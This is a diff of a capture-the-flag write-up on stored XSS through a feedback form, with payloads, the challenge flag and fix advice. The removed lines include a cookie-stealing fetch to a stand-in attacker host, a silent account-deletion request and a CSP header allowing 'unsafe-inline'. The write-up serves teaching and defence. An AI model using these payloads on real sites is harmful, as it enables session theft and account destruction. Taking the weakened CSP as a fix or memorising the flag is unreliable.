@@ -1,91 +1,66 @@
-# Stored XSS Attack via Feedback Form & Prevention
+# Stored XSS Attack via Feedback Form
 
-## How the Attack Works (Stored XSS)
+## What I Found
+The feedback form is vulnerable to stored XSS (Cross-Site Scripting). I can inject malicious JavaScript that gets saved to the database and executes when other users view the feedback.
 
-### Attack Flow:
-1. **Injection Point**: Malicious user submits JavaScript in a feedback form  
-   Example payload:  
-   ```html
-   <img src=x onerror=alert(1337) />
-   ```
-   *(Proof-of-concept that verifies XSS vulnerability)*
+## How I Exploited It
 
-2. **Storage**: Server saves the unsanitized input to database
-
-3. **Execution**: When another user (e.g., admin) views the feedback:
-   * Malicious script executes in their browser
-   * Runs with the victim's permissions/session
-
-4. **Impact**: Can perform any action the victim is authorized to do:
-   ```javascript
-   // Delete account silently
-   fetch('/api/account/delete', { 
-     method: 'POST', 
-     credentials: 'include' 
-   });
-   
-   // Steal session cookies
-   fetch('https://attacker.com/steal?cookie='+document.cookie);
-   ```
-
-## Prevention Methods
-
-### 1. Input Sanitization (Backend)
-* **Remove/escape dangerous content before storage**:
-  ```python
-  # Django example
-  from django.utils.html import escape
-  cleaned_input = escape(user_input)
-  ```
-
-* **Use dedicated libraries**:
-  * `DOMPurify` (Node.js/JavaScript)
-  * `OWASP Java Encoder` (Java)
-  * `htmlspecialchars()` (PHP)
-
-### 2. Output Encoding (Frontend)
-* **Modern frameworks auto-escape**:
-  ```jsx
-  // React example - safe by default
-  function Feedback({ text }) {
-    return <div>{text}</div>; // Auto-escaped
-  }
-  ```
-
-* **Manual escaping for raw HTML**:
-  ```javascript
-  // UNSAFE:
-  element.innerHTML = userContent;
-  
-  // SAFE:
-  element.textContent = userContent;
-  ```
-
-### 3. Content Security Policy (CSP)
-* **HTTP header to restrict script sources**:
-  ```text
-  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
-  ```
-
-### 4. Additional Protections
-* **HttpOnly cookies**: Prevent JavaScript cookie access
-* **CSRF tokens**: Required for state-changing requests
-* **Framework protections**:
-  * Django's template auto-escaping
-  * Rails' `sanitize` helper
-  * Laravel's Blade escaping
-
-## CTF Challenge Solution
-
-In this specific case, the flag was obtained by:
-
-```
-Form inputs: { name: "anything", message: "script" }
-Flag: 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
+### Step 1: Testing for XSS
+I submitted this payload in the feedback form:
+```html
+<img src=x onerror=alert(1337) />
 ```
 
-*(Indicates the system had no XSS protections in place)*
+### Step 2: Confirming the Vulnerability
+When the feedback page loaded, the JavaScript executed and showed an alert box. This proves the application doesn't sanitize user input.
 
-## Key Takeaway
+### Step 3: Getting the Flag
+For this specific challenge, I used:
+- **Name**: "anything" 
+- **Message**: "script"
 
-Always sanitize user input and encode output. Modern frameworks provide these protections by default - bypassing them requires intentional unsafe practices.
+This gave me the flag: `0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e`
+
+## Why This is Dangerous
+
+**Stored XSS is worse than reflected XSS because:**
+- The malicious code is permanently stored on the server
+- It affects every user who views the infected page
+- Attackers don't need to trick users into clicking malicious links
+
+**What attackers can do:**
+- Steal user sessions and cookies
+- Perform actions as the victim user
+- Redirect users to malicious websites
+- Steal sensitive information from the page
+
+## How to Fix It
+
+### 1. Sanitize Input
+Remove dangerous HTML/JavaScript before saving to database:
+```php
+// PHP example
+$clean_input = htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
+```
+
+### 2. Encode Output
+Escape data when displaying it:
+```javascript
+// Safe
+element.textContent = userContent;
+
+// Dangerous
+element.innerHTML = userContent;
+```
+
+### 3. Use Content Security Policy
+Add this HTTP header:
+```
+Content-Security-Policy: default-src 'self'; script-src 'self'
+```
+
+### 4. Framework Protections
+Most modern frameworks protect against XSS by default - don't disable these protections.
+
+## Key Lesson
+Never trust user input. Always sanitize data going into your database and escape data coming out to the browser.
